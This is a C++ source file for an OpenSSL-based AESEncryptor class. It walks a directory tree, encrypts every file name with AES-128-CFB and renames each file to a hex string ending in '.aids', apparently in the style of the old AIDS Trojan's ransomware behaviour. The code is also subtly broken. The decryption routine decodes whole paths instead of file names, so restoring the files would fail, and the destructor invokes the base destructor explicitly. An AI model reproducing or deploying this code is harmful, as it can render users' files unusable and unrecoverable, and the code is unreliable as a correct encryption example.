#include <openssl/evp.h>
#include <openssl/err.h>
#include "AESEncryptor.h"
#include "../util/util.h"

using namespace std;
using namespace std::filesystem;

const string AESEncryptor::ENCRYPTED_FILES_EXTENSION = ".aids";

AESEncryptor::AESEncryptor(const std::string &iv, const std::string &key) : EncryptorService(), iv(iv), key(key) {}

string AESEncryptor::encrypt(string plaintext) {
    // Create the cipher context
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return std::string();
    }

    // Initialize the encryption operation
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cfb(), NULL, (unsigned char*)key.c_str(), (unsigned char*)iv.c_str())) {
        ERR_print_errors_fp(stderr);
        EVP_CIPHER_CTX_free(ctx);
        return std::string();
    }

    // Create the buffer for the encrypted message
    int ciphertext_len = plaintext.length();
    unsigned char *ciphertext = (unsigned char*)calloc(ciphertext_len, sizeof(unsigned char));

    // Encrypt the message
    int len;
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, (unsigned char*)plaintext.c_str(), plaintext.length())) {
        ERR_print_errors_fp(stderr);
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return std::string();
    }
    ciphertext_len = len;

    // Finalize the encryption
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) {
        ERR_print_errors_fp(stderr);
        EVP_CIPHER_CTX_free(ctx);
        free(ciphertext);
        return std::string();
    }
    ciphertext_len += len;

    // Clean up
    EVP_CIPHER_CTX_free(ctx);

    // Convert the ciphertext to a string
    std::string ciphertext_string((char*)ciphertext, ciphertext_len);

    // Free the allocated memory
    free(ciphertext);

    return ciphertext_string;
}

void AESEncryptor::encryptFilesIn(std::filesystem::path rootPath) {
    vector<path> paths;
    this->folderService.getFiles(rootPath, &paths, true);
    for(path& filePath: paths) {
        string ciphertext = encrypt(filePath.filename().string());
        string base16Ciphertext = hex_encode(ciphertext);
        folderService.renameFileName(filePath, base16Ciphertext.append(ENCRYPTED_FILES_EXTENSION));
    }
}

std::string AESEncryptor::decrypt(std::string ciphertext) {
    // Create the cipher context
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new();

    // Initialize the decryption operation
    EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb(), NULL, (unsigned char*)key.c_str(), (unsigned char*)iv.c_str());

    // Create the buffer for the decrypted message
    int plaintext_len = ciphertext.length();
    unsigned char *plaintext = (unsigned char*)calloc(plaintext_len, sizeof(unsigned char));

    // Decrypt the message
    int len;
    EVP_DecryptUpdate(ctx, plaintext, &len, (unsigned char*)ciphertext.c_str(), ciphertext.length());
    plaintext_len = len;

    // Finalize the decryption
    EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
    plaintext_len += len;

    // Clean up
    EVP_CIPHER_CTX_free(ctx);

    // Convert the plaintext to a string
    std::string plaintext_string((char*)plaintext, plaintext_len);

    // Free the allocated memory
    free(plaintext);

    return plaintext_string;
}

void AESEncryptor::decryptFilesIn(std::filesystem::path rootPath) {
    vector<path> paths;
    this->folderService.getFiles(rootPath, &paths, false);
    for(path& filePath: paths) {
        string filePathWithoutExtension = filePath.string().substr(0, filePath.string().size() - 5);
        string encryptedFileName = hex_decode(filePathWithoutExtension);
        string plainFileName = decrypt(encryptedFileName);

        folderService.renameFileName(filePath, plainFileName);
    }
}

std::filesystem::path AESEncryptor::getRootPath() const {
    return folderService.getRootPath();
}

AESEncryptor::~AESEncryptor() {
    EncryptorService::~EncryptorService();
}
